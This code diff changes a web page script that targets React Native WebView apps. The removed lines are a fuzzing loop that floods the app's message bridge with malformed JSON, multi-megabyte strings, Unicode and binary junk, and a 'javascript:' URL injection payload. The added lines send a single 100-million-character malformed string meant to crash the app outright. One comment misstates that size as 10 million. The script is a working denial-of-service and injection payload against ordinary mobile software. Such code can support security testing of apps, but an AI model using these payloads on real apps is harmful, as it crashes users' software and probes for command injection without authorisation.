@@ -5,43 +5,17 @@
 <script>
 const log = msg => document.getElementById("log").textContent += "\n" + msg;
 
-function sendPayload(payload, description) {
-    try {
-        window.ReactNativeWebView.postMessage(payload);
-        log(`Sent (${description}): ${payload.substring(0, 50)}...`);
-    } catch (e) {
-        log(`Error sending (${description}): ${e.message}`);
-    }
-}
-
 try {
     if (window.ReactNativeWebView) {
-        log("ReactNativeWebView handler detected (Android). Starting full stress test...");
+        log("ReactNativeWebView detected. Sending crash payload...");
 
-        // Loop kirim payload setiap 50ms
-        setInterval(() => {
-            // 1. Malformed JSON
-            sendPayload("{unclosed_json", "Malformed JSON");
+        // Payload besar + JSON rusak
+        const payload = "{".repeat(100_000_000); // 10 juta karakter '{'
+        window.ReactNativeWebView.postMessage(payload);
 
-            // 2. Large JSON (~1MB)
-            const bigPayload = '{"data":"' + "B".repeat(9_000_000) + '"}';
-            sendPayload(bigPayload, "Large JSON (~1MB)");
-
-            // 3. Unicode flood
-            const unicodeFlood = '{"data":"' + "\u200F".repeat(20000) + '"}';
-            sendPayload(unicodeFlood, "Unicode flood");
-
-            // 4. Random binary data (1000 bytes)
-            const binaryData = String.fromCharCode(...Array(1000).fill(0xFF));
-            sendPayload(binaryData, "Binary data");
-
-            // 5. Injection-like payload
-            const injectionPayload = '{"cmd":"open_url","url":"javascript:alert(1)"}';
-            sendPayload(injectionPayload, "Command injection");
-        }, 0);
-
+        log("Payload sent. App may crash immediately.");
     } else {
-        log("ReactNativeWebView handler not available.");
+        log("ReactNativeWebView not available.");
     }
 } catch (e) {
     log("JS Exception: " + e.message);
